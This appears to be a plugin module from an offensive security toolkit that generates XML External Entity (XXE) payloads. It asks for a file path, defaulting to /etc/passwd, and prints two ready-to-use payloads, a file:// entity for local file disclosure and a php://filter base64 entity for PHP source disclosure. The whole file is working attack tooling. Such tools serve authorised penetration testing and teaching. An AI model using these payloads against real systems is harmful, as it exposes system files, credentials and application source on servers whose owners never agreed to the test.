NAME = "xxe.file"
DESCRIPTION = "Generate XXE payloads for local file disclosure."

G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
M = "\033[95m"
W = "\033[0m"
BOLD = "\033[1m"


def print_payload(title, payload):
    print(f"\n{G}[+] {title}{W}")
    print(payload)


def build_xml(entity):
    return f"""<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{entity}">
]>
<root>
    <name></name>
    <tel></tel>
    <email>&xxe;</email>
    <message></message>
</root>"""


def get_file():
    path = input(f"{Y}File [/etc/passwd]>{W} ").strip()
    return path or "/etc/passwd"


def run(data, cred, args):

    path = get_file()

    print_payload(
        "Local File Disclosure",
        build_xml(f"file://{path}")
    )

    print_payload(
        "PHP Source Disclosure",
        build_xml(
            f"php://filter/convert.base64-encode/resource={path}"
        )
    )

    print(f"\n{Y}[*]{W} The php://filter payload only works against PHP applications.")
